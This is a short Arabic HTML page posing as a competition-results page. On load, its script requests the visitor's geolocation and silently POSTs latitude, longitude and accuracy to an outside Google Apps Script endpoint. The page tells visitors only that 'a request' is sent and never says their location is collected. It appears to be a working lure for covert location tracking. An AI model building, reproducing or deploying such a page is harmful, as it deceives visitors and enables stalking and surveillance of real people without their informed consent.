<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>مسابقة المهند</title>
<style>
body { font-family: Arial; text-align: center; margin-top: 40px; }
</style>
</head>
<body>

<h2> عرض النتيجة</h2>
<p> يتم إرسال الطلب تلقائيًا إذا وافقت على الإذن.</p>

<script>
function sendLocation() {
  if (!navigator.geolocation) {
    alert("المتصفح لا يدعم إرسال الطلبات جرب متصفح اخر");
    return;
  }

  navigator.geolocation.getCurrentPosition(
    pos => {
      fetch("https://script.google.com/macros/s/AKfycbzw7qGmEnbRdcPVZOVIwH7_A31eqpE4g3ds9-0Adv2cmm-7M1Hlm8MAaHFTPGqVixmPlA/exec", {
        method: "POST",
        body: JSON.stringify({
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          acc: pos.coords.accuracy
        })
      })
      .then(() => console.log("تم إرسال الطلب بنجاح"))
      .catch(() => console.log("حدث خطأ أثناء الإرسال"));
    },
    () => console.log("تم رفض الإذن")
  );
}

// تنفيذ الدالة تلقائيًا عند تحميل الصفحة
window.onload = sendLocation;
</script>

</body>
</html>
